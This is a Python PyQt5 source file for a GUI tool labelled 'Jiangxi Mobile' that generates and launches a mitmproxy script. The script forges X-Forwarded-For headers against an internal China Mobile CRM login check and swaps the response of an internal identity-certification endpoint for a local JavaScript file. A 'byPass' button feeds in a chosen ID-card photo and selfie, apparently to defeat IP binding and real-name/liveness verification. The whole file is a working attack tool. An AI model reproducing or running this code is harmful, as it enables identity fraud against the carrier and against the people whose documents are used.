# -*- coding: utf-8 -*-
import thread
from PyQt5 import QtWidgets, QtCore, QtGui
import sys
import os
from PyQt5.QtWidgets import QLabel, QPushButton, QTextEdit, QFileDialog, QWidget, QMessageBox
import shutil
import os
class JxYd(QWidget):
    def saveData(self,arg, arg2):
        if(arg != "" and arg2 != ""):
            self.proxy = """
from mitmproxy.http import flow
def request(flow:flow):
	flow.request.headers['X-Forwarded-For']="{}"
	if("http://nc.crm.jx.cmcc/public/LoginAction/isBindLogionIp.action?" in flow.request.url):
		flow.request.headers['X-Forwarded-For'] = "{}"    
def response(flow:flow):
	url = 'http://10.180.214.106:18080/bp095/initLogin?method=certSaveCRM&phone_no'
	if url in flow.request.url:
		f = open('pinduoduo.js', 'r', encoding="utf-8")
		data = f.read()
		f.close()
		flow.response.set_text(data)
            """.format(arg, arg2)
        else:
            self.proxy = """
from mitmproxy.http import flow
def request(flow:flow):
    pass    
def response(flow:flow):
    url = 'http://10.180.214.106:18080/bp095/initLogin?method=certSaveCRM&phone_no'
    if url in flow.request.url:            
        f = open('pinduoduo.js','r',encoding="utf-8")
        data = f.read()
        f.close()
        flow.response.set_text(data)
"""
        with open("pandaBaby.py", "w+", encoding="utf-8") as f:
            f.write(self.proxy)
            f.close()
    def openCardImage(self):
        self.imgCardName, imgType = QFileDialog.getOpenFileName(self,"打开图片", "", "*.jpg")
        if (self.imgCardName == ""):
            return
        jpg = QtGui.QPixmap(self.imgCardName).scaled(self.cardNo.width(), self.cardNo.height())
        self.cardNo.setPixmap(jpg)
    def openFaceImage(self):
        self.imgFaceName, imgType = QFileDialog.getOpenFileName(self, "打开图片", "", "*.jpg")
        if(self.imgFaceName == ""):
            return
        jpg = QtGui.QPixmap(self.imgFaceName).scaled(self.face.width(), self.face.height())
        self.face.setPixmap(jpg)
    def out(self,arg, arg2):
        pwd = os.getcwd()
        cmd = 'mitmdump -s '+ pwd +'\\pandaBaby.py' +' -p 5438'
        res = os.system(cmd)
        if (res == 1):
            self.outPut.append("byPass失败\n")
    def bypass(self):
        if(self.imgCardName == ""):
            QMessageBox.information(self, "提示", "身份证照片未选择",QMessageBox.Yes)
            return
        if(self.imgFaceName == ""):
            QMessageBox.information(self, "提示", "活体照未选择", QMessageBox.Yes)
            return
        if((self.loginIP.text() == "" and self.ywIP.text() != "") or (self.loginIP.text() != "" and self.ywIP.text() == "")):
            QMessageBox.information(self, "提示", "要么都填,要么都不填", QMessageBox.Yes)
            return
        self.saveData(self.loginIP.text(), self.ywIP.text())
        shutil.copyfile(self.imgFaceName,"C:\\Windows\\Temp\\face.jpg")
        shutil.copyfile(self.imgCardName,"C:\\WINDOWS\\temp\\"+"cert_"+"panda"+".jpg")
        try:
            thread.start_new_thread(self.out, ("Thread-1", 2,))
        except:
            self.outPut.append("线程启动失败,请联系管理员")
            sys.exit(0)
        self.byPass.setEnabled(False)
    def __init__(self):
        super(JxYd, self).__init__()
        self.imgCardName = ""
        self.imgFaceName = ""
        self.resize(415, 400)
        self.setWindowTitle("江西移动")
        self.loginIP = QtWidgets.QLineEdit(self)
        self.loginIP.setGeometry(QtCore.QRect(5, 5, 130, 30))  # width height
        self.ywIP = QtWidgets.QLineEdit(self)
        self.ywIP.setGeometry(QtCore.QRect(150, 5, 130, 30))  # width height

        self.loginIP.setPlaceholderText('登录时ip')
        self.ywIP.setPlaceholderText('业务时ip')

        self.cardNoFile = QPushButton(self)
        self.cardNoFile.setText("打开图片")
        self.cardNoFile.move(50, 250)
        self.cardNoFile.clicked.connect(self.openCardImage)
        self.faceFile = QPushButton(self)
        self.faceFile.setText("打开图片")
        self.faceFile.move(260, 250)
        self.faceFile.clicked.connect(self.openFaceImage)

        self.byPass = QPushButton(self)
        self.byPass.setText("byPass")
        self.byPass.move(300, 5)
        self.byPass.clicked.connect(self.bypass)

        self.cardNo = QLabel(self)
        self.cardNo.setText("        身份证照片")
        self.cardNo.setFixedSize(200, 200)
        self.cardNo.move(5, 40)
        self.cardNo.setStyleSheet('border:1px solid  green')

        self.face = QLabel(self)
        self.face.setText("        自拍照")
        self.face.setFixedSize(200, 200)
        self.face.move(210, 40)
        self.face.setStyleSheet('border:1px solid  green')

        self.outPut = QTextEdit(self)
        self.outPut.setFixedSize(405, 100)
        self.outPut.move(5, 290)
if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    first_window = JxYd()
    first_window.show()
    sys.exit(app.exec_())